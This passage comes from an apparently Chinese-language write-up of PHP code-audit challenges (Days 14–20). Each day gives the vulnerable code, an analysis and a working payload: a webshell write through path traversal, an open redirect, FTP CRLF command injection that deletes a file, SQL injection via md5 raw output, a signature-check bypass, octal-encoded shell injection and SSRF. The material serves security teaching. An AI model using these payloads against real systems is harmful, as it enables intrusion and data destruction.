class="number">1</span>, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($input <span class="keyword">as</span> $field =&gt; $count) &#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;$field = $count++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    file_put_contents(</span><br><span class="line">      <span class="keyword">self</span>::EXTERNAL_DIRECTORY . <span class="keyword">$this</span>-&gt;id,</span><br><span class="line">      var_export(get_object_vars(<span class="keyword">$this</span>), <span class="keyword">true</span>)</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$carrot = <span class="keyword">new</span> Carrot($_GET);</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>foreach处存在明显的变量覆盖漏洞，因此写入文件的名称以及路径完全可控。</p><p>代码中因使用了<code>var_export</code>对对象数组进行了处理，会获取示例的所有的属性，那么我们就可以构造属性进行写入。参数含义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_export ( mixed $expression [, bool $return ] ) : mixed</span><br><span class="line">此函数返回关于传递给该函数的变量的结构信息，它和 var_dump() 类似，不同的是其返回的表示是合法的 PHP 代码。</span><br><span class="line">您可以通过将函数的第二个参数设置为 TRUE，从而返回变量的表示。</span><br></pre></td></tr></table></figure><h3 id="漏洞验证-3"><a href="#漏洞验证-3" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=../../var/www/html/test/shell.php&amp;t1=1%22%3C%3Fphp%20phpinfo%28%29%3F%3E%224</span><br></pre></td></tr></table></figure><h2 id="Day-15-Sleigh-Ride"><a href="#Day-15-Sleigh-Ride" class="headerlink" title="Day 15 - Sleigh Ride"></a>Day 15 - Sleigh Ride</h2><h3 id="漏洞代码-4"><a href="#漏洞代码-4" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Redirect</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $websiteHost = <span class="string">'www.example.com'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">setHeaders</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">    $url = urldecode($url);</span><br><span class="line">    header(<span class="string">"Location: $url"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">startRedirect</span><span class="params">($params)</span> </span>&#123;</span><br><span class="line">    $parts = explode(<span class="string">'/'</span>, $_SERVER[<span class="string">'PHP_SELF'</span>]);</span><br><span class="line">    $baseFile = end($parts);</span><br><span class="line">    $url = sprintf(</span><br><span class="line">      <span class="string">"%s?%s"</span>,</span><br><span class="line">      $baseFile,</span><br><span class="line">      http_build_query($params)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">$this</span>-&gt;setHeaders($url);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'redirect'</span>]) &#123;</span><br><span class="line">  (<span class="keyword">new</span> Redirect())-&gt;startRedirect($_GET[<span class="string">'params'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码处理自身的url路径来得到下一步需要跳转的url，通过<code>explode</code>函数分割url，再通过<code>end</code>函数得到最后一个文件的路径。可以做以下测试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(explode('/', 'http://www.test.com/index.php'));</span><br><span class="line">array(4) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) "http:"</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(0) ""</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(12) "www.test.com"</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(9) "index.php"</span><br><span class="line">&#125;</span><br><span class="line">php &gt; var_dump(explode('/', 'http://www.test.com/www.hacker.com'));</span><br><span class="line">array(4) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) "http:"</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(0) ""</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(12) "www.test.com"</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(14) "www.hacker.com"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此跳转的路径是可控的，但这样还不能进行跳转，需要加上<code>http</code>协议。</p><h3 id="漏洞验证-4"><a href="#漏洞验证-4" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>当对目标的url进行一次编码时会报错，需要进行两次url编码。进行二次编码之后，<code>index.php/http%253A%252f%252fwww.vulnspy.com?redirect=1</code>,经过<code>$baseFile = end($parts);</code>得到的就是<code>http%3A%2f%2fwww.vulnspy.com</code>。最后进入到<code>$url = urldecode($url);header(&quot;Location: $url&quot;);</code>，最终跳转的目录就是<code>http://www.vulnspy.com?</code>,这样就可以完成任意网站的跳转了。</p><h2 id="Day-16-Poem"><a href="#Day-16-Poem" class="headerlink" title="Day 16 - Poem"></a>Day 16 - Poem</h2><h3 id="漏洞代码-5"><a href="#漏洞代码-5" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FTP</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $sock;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($host, $port, $user, $pass)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;sock = fsockopen($host, $port);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;login($user, $pass);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;cleanInput();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;mode($_REQUEST[<span class="string">'mode'</span>]);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;send($_FILES[<span class="string">'file'</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanInput</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $_GET = array_map(<span class="string">'intval'</span>, $_GET);</span><br><span class="line">    $_POST = array_map(<span class="string">'intval'</span>, $_POST);</span><br><span class="line">    $_COOKIE = array_map(<span class="string">'intval'</span>, $_COOKIE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">    fwrite(<span class="keyword">$this</span>-&gt;sock, <span class="string">"USER "</span> . $username . <span class="string">"\n"</span>);</span><br><span class="line">    fwrite(<span class="keyword">$this</span>-&gt;sock, <span class="string">"PASS "</span> . $password . <span class="string">"\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">mode</span><span class="params">($mode)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($mode == <span class="number">1</span> || $mode == <span class="number">2</span> || $mode == <span class="number">3</span>) &#123;</span><br><span class="line">      fputs(<span class="keyword">$this</span>-&gt;sock, <span class="string">"MODE $mode\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    fputs(<span class="keyword">$this</span>-&gt;sock, $data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> FTP(<span class="string">'localhost'</span>, <span class="number">21</span>, <span class="string">'user'</span>, <span class="string">'password'</span>);</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码中<code>cleanInput</code>函数对输入的参数进行了<code>intval</code>处理，但这样依然无法改变<code>$_REQUEST</code>所获取的参数值，因为<code>$_REQUEST</code>是直接从GET，POST 和 COOKIE中取值，不是他们的引用。即使后续<code>GET，POST 和 COOKIE</code>发生了变化，也不会影响<code>$_REQUEST</code>的结果。测试如下（test.php）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FTP</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;cleanInput();</span><br><span class="line">    var_dump($_GET);</span><br><span class="line">    var_dump($_REQUEST);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanInput</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $_GET = array_map(<span class="string">'intval'</span>, $_GET);</span><br><span class="line">    $_POST = array_map(<span class="string">'intval'</span>, $_POST);</span><br><span class="line">    $_COOKIE = array_map(<span class="string">'intval'</span>, $_COOKIE);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> FTP();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123; [<span class="string">"id"</span>]=&gt; int(<span class="number">1</span>) &#125; <span class="keyword">array</span>(<span class="number">1</span>) &#123; [<span class="string">"id"</span>]=&gt; string(<span class="number">5</span>) <span class="string">"1test"</span> &#125;</span><br></pre></td></tr></table></figure><p>代码中比较mode时使用了弱比较，可以很轻易绕过造成任意文件删除。</p><h3 id="漏洞验证-5"><a href="#漏洞验证-5" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mode=1%0a%0dDELETE%20test.file</span><br></pre></td></tr></table></figure><h2 id="Day-17-Mistletoe"><a href="#Day-17-Mistletoe" class="headerlink" title="Day 17 - Mistletoe"></a>Day 17 - Mistletoe</h2><h3 id="漏洞代码-6"><a href="#漏洞代码-6" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RealSecureLoginManager</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $em;</span><br><span class="line">  <span class="keyword">private</span> $user;</span><br><span class="line">  <span class="keyword">private</span> $password;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $password)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;em = DoctrineManager::getEntityManager();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;user = $user;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $pass = md5(<span class="keyword">$this</span>-&gt;password, <span class="keyword">true</span>);</span><br><span class="line">    $user = <span class="keyword">$this</span>-&gt;sanitizeInput(<span class="keyword">$this</span>-&gt;user);</span><br><span class="line"></span><br><span class="line">    $queryBuilder = <span class="keyword">$this</span>-&gt;em-&gt;createQueryBuilder()</span><br><span class="line">      -&gt;select(<span class="string">"COUNT(p)"</span>)</span><br><span class="line">      -&gt;from(<span class="string">"User"</span>, <span class="string">"u"</span>)</span><br><span class="line">      -&gt;where(<span class="string">"password = '$pass' AND user = '$user'"</span>);</span><br><span class="line">    $query = $queryBuilder-&gt;getQuery();</span><br><span class="line">    <span class="keyword">return</span> boolval($query-&gt;getSingleScalarResult());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeInput</span><span class="params">($input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addslashes($input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$auth = <span class="keyword">new</span> RealSecureLoginManager(</span><br><span class="line">  $_POST[<span class="string">'user'</span>],</span><br><span class="line">  $_POST[<span class="string">'passwd'</span>]</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (!$auth-&gt;isValid()) &#123;</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-6"><a href="#漏洞分析-6" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>乍一看这段代码与<code>Day 13 - Turkey Baster</code>上的代码类似，但没有了字符串的截断操作，但是在对密码加密处看到调用了md5函数，并还有类一个选项为true，看一下官方手册：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">md5 ( string $str [, bool $raw_output = FALSE ] ) : string</span><br><span class="line">使用 » RSA 数据安全公司的 MD5 报文算法计算 str 的 MD5 散列值。</span><br><span class="line">str</span><br><span class="line">原始字符串。</span><br><span class="line">raw_output</span><br><span class="line">如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</span><br></pre></td></tr></table></figure><p>本地测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(md5(128, true));</span><br><span class="line">res:string(16) &quot;v�an���l���q��\&quot;</span><br></pre></td></tr></table></figure><h3 id="漏洞验证-6"><a href="#漏洞验证-6" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>可见经过md5(str, true)的转换，最后一位会产生反斜杠，造成单引号逃逸，payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=128&amp;user=&apos; or 1%23</span><br></pre></td></tr></table></figure><h2 id="Day-18-Sign"><a href="#Day-18-Sign" class="headerlink" title="Day 18 - Sign"></a>Day 18 - Sign</h2><h3 id="漏洞代码-7"><a href="#漏洞代码-7" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JWT</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verifyToken</span><span class="params">($data, $signature)</span> </span>&#123;</span><br><span class="line">    $pub = openssl_pkey_get_public(<span class="string">"file://pub_key.pem"</span>);</span><br><span class="line">    $signature = base64_decode($signature);</span><br><span class="line">    <span class="keyword">if</span> (openssl_verify($data, $signature, $pub)) &#123;</span><br><span class="line">      $object = json_decode(base64_decode($data));</span><br><span class="line">      <span class="keyword">$this</span>-&gt;loginAsUser($object);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> JWT())-&gt;verifyToken($_GET[<span class="string">'d'</span>], $_GET[<span class="string">'s'</span>]);</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-7"><a href="#漏洞分析-7" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>本题目的问题是在于<code>openssl_verify()</code>的错误使用，根据php手册说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl_verify ( string $data , string $signature , mixed $pub_key_id [, mixed $signature_alg = OPENSSL_ALGO_SHA1 ] ) : int</span><br><span class="line">openssl_verify() 使用与pub_key_id关联的公钥验证指定数据data的签名signature是否正确。这必须是与用于签名的私钥相对应的公钥。</span><br><span class="line">如果签名正确返回 1, 签名错误返回 0, 内部发生错误则返回-1.</span><br></pre></td></tr></table></figure><p>但是在<code>if</code>判断中得到的结果是True，if判断只有遇到<code>0</code>或者是<code>false</code>返回的才是<code>false</code>。所以如果能够使得<code>openssl_verify()</code>出错返回<code>-1</code>就能够绕过验证。</p><h3 id="漏洞验证-7"><a href="#漏洞验证-7" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>如果让<code>openssl_verify()</code>出错呢？我们使用一个其他的<code>pub_key.pem</code>来生成<code>data</code>和<code>signature</code>,这样就可以使得<code>openssl_verify()</code>返回-1。在本题中既然已经知道了<code>openssl_verify()</code>返回结果，我们可以使用<code>if(openssl_verify()===1)</code>来避免被绕过。</p><h2 id="Day-19-Birch"><a href="#Day-19-Birch" class="headerlink" title="Day 19 - Birch"></a>Day 19 - Birch</h2><h3 id="漏洞代码-8"><a href="#漏洞代码-8" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImageViewer</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $file;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;file = <span class="string">"images/$file"</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;createThumbnail();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">createThumbnail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $e = stripcslashes(</span><br><span class="line">      preg_replace(</span><br><span class="line">        <span class="string">'/[^0-9\\\]/'</span>,</span><br><span class="line">        <span class="string">''</span>,</span><br><span class="line">        <span class="keyword">isset</span>($_GET[<span class="string">'size'</span>]) ? $_GET[<span class="string">'size'</span>] : <span class="string">'25'</span></span><br><span class="line">      )</span><br><span class="line">    );</span><br><span class="line">    system(<span class="string">"/usr/bin/convert $this-&gt;file --resize $e</span></span><br><span class="line"><span class="string">      ./thumbs/$this-&gt;file"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"&lt;a href=$this-&gt;file&gt;</span></span><br><span class="line"><span class="string">      &lt;img src=./thumbs/$this-&gt;file&gt;&lt;/a&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> ImageViewer(<span class="string">"image.png"</span>));</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-8"><a href="#漏洞分析-8" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码中唯一可控的点为<code>size</code>，但是经过了<code>preg_replace</code>的替换，非<code>0-9</code>或<code>\</code>都将替换为空，在system函数出不太好进行命令执行，但之后又经过了stripcslashes函数的处理，。首先来看一下stripcslashes函数的作用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stripcslashes ( string $str ) : string</span><br><span class="line">返回反转义后的字符串。可识别类似 C 语言的 \n，\r，... 八进制以及十六进制的描述。</span><br></pre></td></tr></table></figure><p>测试如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(stripcslashes(&apos;0\073\163\154\145\145\160\0405\073&apos;));</span><br><span class="line">string(10) &quot;0;sleep 5;&quot;</span><br></pre></td></tr></table></figure><h3 id="漏洞验证-8"><a href="#漏洞验证-8" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>通过上面的测试，发现<code>stripcslashes</code>刚好把八进制转为了字符串，输入中又没有存在字母的情况，payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0\073\163\154\145\145\160\0405\073</span><br></pre></td></tr></table></figure><p>那么最终能够执行的命令就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/convert images/image.png --resize 0;sleep 5; ./thumbs/image.png</span><br></pre></td></tr></table></figure><h2 id="Day-20-Stocking"><a href="#Day-20-Stocking" class="headerlink" title="Day 20 - Stocking"></a>Day 20 - Stocking</h2><h3 id="漏洞代码-9"><a href="#漏洞代码-9" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">set_error_handler(<span class="function"><span class="keyword">function</span> <span class="params">($no, $str, $file, $line)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> ErrorException($str, <span class="number">0</span>, $no, $file, $line);</span><br><span class="line">&#125;, E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImageLoader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getResult</span><span class="params">($uri)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!filter_var($uri, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'&lt;p&gt;Please enter valid uri&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      $image = file_get_contents($uri);</span><br><span class="line">      $path = <span class="string">"./images/"</span> . uniqid() . <span class="string">'.jpg'</span>;</span><br><span class="line">      file_put_contents($path, $image);</span><br><span class="line">      <span class="keyword">if</span> (mime_content_type($path) !== <span class="string">'image/jpeg'</span>) &#123;</span><br><span class="line">      unlink($path);</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'&lt;p&gt;Only .jpg files allowed&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'&lt;p&gt;There was an error: '</span> .</span><br><span class="line">      $e-&gt;getMessage() . <span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;img src="'</span> . $path . <span class="string">'" width="100"/&gt;'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> ImageLoader())-&gt;getResult($_GET[<span class="string">'img'</span>]);</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-9"><a href="#漏洞分析-9" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>本题目的是问题是在于提供了错误显示，这样就导致可以根据错误信息推断服务器上面的信息，类似于MYSQL中的报错注入。而在本题中则是存在一个SSRF漏洞。分析代码，在代码的最前方有：<code>set_error_handler(function ($no, $str, $file, $line) { throw new ErrorException($str, 0, $no, $file, $line);}, E_ALL);</code>这个就类似于设置如下的代码：<code>error_reporting(E_ALL);ini_set(&#39;display_errors&#39;, TRUE);ini_set(&#39;display_startup_errors&#39;, TRUE);</code>，如此就会包含所有的错误信息。</p><p>错误的显示配置加上<code>&#39;There was an error: &#39; .$e-&gt;getMessage() . &#39;&#39;</code>就导致会在页面上显示所有的信息，包括warning信息。</p><h3 id="漏洞验证-9"><a href="#漏洞验证-9" class="headerlink" 